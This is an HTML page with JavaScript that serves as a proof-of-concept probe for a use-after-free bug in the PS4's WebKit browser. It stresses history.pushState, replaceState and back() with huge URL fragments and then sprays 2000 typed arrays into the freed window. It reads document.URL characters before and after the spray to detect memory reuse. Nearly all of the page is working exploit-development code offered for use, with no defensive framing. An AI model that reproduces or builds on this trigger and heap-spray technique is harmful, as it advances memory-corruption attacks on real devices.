<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Critical UAF Window Probe</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { font-size:16px; }
pre { white-space:pre-wrap; }
</style>
</head>
<body>

<h2>PS4 WebKit – Critical UAF Window Probe</h2>
<button onclick="run()">RUN TEST</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(s){ logEl.textContent += s + "\n"; }
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function triggerUAF(){
    let size = 977;
    const STEP = 14461;

    log("=== UAF TRIGGER START ===");

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log("[ITER "+i+"] back() async");
        }

        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
}

function snapshot(tag){
    let u = document.URL;
    log(tag + " URL.length = " + u.length);
    [64,128,256,512,1024,4096].forEach(o=>{
        try{
            log(tag+" charCodeAt("+o+") = " + u.charCodeAt(o));
        }catch(e){
            log(tag+" charCodeAt("+o+") = EXCEPTION");
        }
    });
}

async function run(){
    logEl.textContent = "";
    await triggerUAF();

    // CRITICAL WINDOW — NO COLLAPSE
    await sleep(60);

    log("\n=== BASELINE (PRE-ALLOCATION) ===");
    snapshot("[BASE]");

    log("\n=== ALLOCATING TYPED ARRAYS IN WINDOW ===");

    let buffers = [];
    for(let i=0;i<2000;i++){
        buffers.push(new Uint32Array(256));
    }

    log("Allocated Uint32Array x 2000");

    await sleep(30);

    log("\n=== POST-ALLOCATION READ ===");
    snapshot("[POST]");

    log("\n=== TEST END (NO FRAGMENT COLLAPSE) ===");
}
</script>
</body>
</html>
